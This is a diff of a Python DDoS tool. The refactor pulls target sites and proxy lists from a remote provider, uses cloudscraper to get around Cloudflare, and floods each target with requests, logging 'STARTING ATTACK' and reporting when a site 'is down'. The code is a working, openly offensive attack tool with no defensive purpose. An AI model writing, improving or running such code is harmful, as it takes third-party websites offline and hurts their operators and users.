@@ -6,11 +6,9 @@ from argparse import ArgumentParser
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from gc import collect
 from os import system
-from random import choice
 from sys import stderr
 from threading import Thread
 from time import sleep
-from urllib.parse import unquote
 
 import cloudscraper
 from loguru import logger
@@ -19,16 +17,9 @@ from requests.exceptions import ConnectionError
 from urllib3 import disable_warnings
 
 import settings
+from RemoteProvider import RemoteProvider
 
 disable_warnings()
-
-
-def clear():
-    if platform.system() == "Linux":
-        return system('clear')
-    else:
-        return system('cls')
-
 
 parser = ArgumentParser()
 parser.add_argument('threads', nargs='?', default=settings.DEFAULT_THREADS)
@@ -46,7 +37,7 @@ args, unknown = parser.parse_known_args()
 no_clear = args.no_clear
 proxy_view = args.proxy_view
 
-targets = args.targets
+remoteProvider = RemoteProvider(args.targets)
 threads = int(args.threads)
 
 logger.remove()
@@ -66,6 +57,7 @@ def check_req():
     os.system("python -m pip install -r requirements.txt")
     os.system("pip install -r requirements.txt")
     os.system("pip3 install -r requirements.txt")
+
 
 
 def check_update():
@@ -92,46 +84,33 @@ def check_update():
 
 
 def mainth():
+    result = 'processing'
+    scraper = cloudscraper.create_scraper(
+        browser=settings.BROWSER, )
+    scraper.headers.update(
+        {'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(),
+         'Connection': 'keep-alive',
+         'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
+         'Accept-Encoding': 'gzip, deflate, br'})
+
     while True:
-        scraper = cloudscraper.create_scraper(
-            browser=settings.BROWSER, )
-        scraper.headers.update(
-            {'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(),
-             'Connection': 'keep-alive',
-             'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
-             'Accept-Encoding': 'gzip, deflate, br'})
         logger.info("GET RESOURCES FOR ATTACK")
-        host = choice(settings.HOSTS)
-        content = scraper.get(host).content
-        if content:
-            try:
-                data = json.loads(content)
-            except json.decoder.JSONDecodeError:
-                logger.info('Host {} has invalid format'.format(host))
-                sleep(5)
-                continue
-            except Exception:
-                logger.exception('Unexpected error. Host {}'.format(host))
-                sleep(5)
-                continue
-        else:
+        try:
+            site = remoteProvider.get_target_site()
+        except Exception as e:
+            logger.exception(e)
             sleep(5)
             continue
 
-        site = unquote(choice(targets) if targets else data['site']['page'])
         logger.info("STARTING ATTACK TO " + site)
-        logger.info("STARTING ATTACK ON " + data['site']['page'])
-        site = unquote(data['site']['page'])
-        if not site.startswith('http'):
-            site = "https://" + site
 
         attacks_number = 0
 
         try:
-            attack = scraper.get(site, timeout=10)
+            attack = scraper.get(site, timeout=settings.READ_TIMEOUT)
 
             if attack.status_code >= 302:
-                for proxy in data['proxy']:
+                for proxy in remoteProvider.get_proxies():
                     if proxy_view:
                         logger.info('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
                     scraper.proxies.update(
@@ -150,7 +129,7 @@ def mainth():
                     logger.info("ATTACKED; RESPONSE CODE: " +
                                 str(response.status_code))
             if attacks_number > 0:
-                logger.success("SUCCESSFUL ATTACKS on" + site + ": " + str(attacks_number))
+                logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
         except ConnectionError as exc:
             logger.success(f"{site} is down: {exc}")
         except Exception as exc:
@@ -159,6 +138,13 @@ def mainth():
             continue
         finally:
             return result, site
+
+
+def clear():
+    if platform.system() == "Linux":
+        return system('clear')
+    else:
+        return system('cls')
 
 
 def cleaner():
